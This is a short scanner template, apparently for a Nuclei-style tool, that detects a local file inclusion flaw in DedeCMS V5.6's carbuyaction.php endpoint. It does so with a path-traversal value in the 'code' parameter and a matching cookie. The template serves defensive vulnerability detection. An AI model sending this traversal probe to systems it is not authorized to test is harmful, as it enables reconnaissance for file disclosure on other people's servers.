id: dedecms-carbuyaction-fileinclude
name: DedeCmsV5.6 Carbuyaction Fileinclude
severity: high
confidence: confirmed
description: A vulnerability in DedeCMS's 'carbuyaction.php' endpoint allows remote attackers to return the content of locally
  stored files via a vulnerability in the 'code' parameter.
reference: https://www.cnblogs.com/milantgh/p/3615986.html
tags:
- dedecms
- vuln
requests:
- method: GET
  path: /plus/carbuyaction.php?dopost=return&code=../../
  matchers:
  - type: body
    words:
    - Cod::respond()
  - type: status
    status:
    - 200
  condition: and
  headers:
    Cookie: code=cod
